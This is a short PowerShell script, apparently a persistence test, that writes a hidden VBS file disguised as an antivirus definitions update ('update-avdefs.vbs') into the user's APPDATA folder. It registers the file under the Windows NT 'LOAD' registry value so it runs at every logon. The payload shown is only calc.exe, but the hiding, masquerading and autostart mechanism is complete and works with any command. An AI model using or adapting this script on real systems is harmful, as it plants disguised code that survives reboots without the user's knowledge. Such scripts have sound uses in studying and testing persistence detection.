$vbsPath = "$env:APPDATA\update-avdefs.vbs"
$command = "calc.exe"
"Set oShell = CreateObject (`"WScript.Shell`"):oShell.run `"$($command)`"" > $env:APPDATA\update-avdefs.vbs
$fileObj = get-item $vbsPath -Force
$fileObj.Attributes="Hidden"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name LOAD -Value $vbsPath
Test-Path  $env:APPDATA\update-avdefs.vbs -PathType Leaf
